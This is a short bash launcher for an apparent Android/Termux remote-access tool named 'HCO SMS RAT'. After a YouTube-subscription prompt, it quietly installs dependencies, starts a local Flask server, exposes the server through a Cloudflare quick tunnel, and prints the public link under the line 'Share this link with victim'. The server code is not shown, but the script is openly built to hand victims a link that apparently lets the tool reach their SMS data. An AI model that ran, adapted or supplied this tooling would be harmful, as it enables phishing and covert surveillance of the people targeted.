#!/bin/bash

# Colors
RED='\033[1;91m'
GREEN='\033[1;92m'
NC='\033[0m'

clear
echo -e "${RED}This tool is not free. Subscribe to our YouTube channel to continue."
sleep 2
echo -e "Redirecting in 8 seconds..."
sleep 8

termux-open-url "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"

read -p $'\n\033[1;97m[+] Press Enter after subscribing to continue...'

clear
echo -e "${RED}╔══════════════════════════════╗"
echo -e "${RED}║       ${GREEN}\e[1mHCO SMS RAT\e[0m        ${RED}║"
echo -e "${RED}╚══════════════════════════════╝"

echo -e "${NC}"
echo "[•] Installing requirements..."
pip install -r requirements.txt > /dev/null 2>&1

echo "[•] Starting Flask server..."
python3 main.py &

sleep 5

echo "[•] Starting Cloudflare tunnel..."
cloudflared tunnel --url http://127.0.0.1:5000 --logfile tunnel.log > /dev/null 2>&1 &

sleep 6

echo ""
echo "[✓] Server & Tunnel running."
echo "[✓] Share this link with victim:"
grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' tunnel.log
echo ""
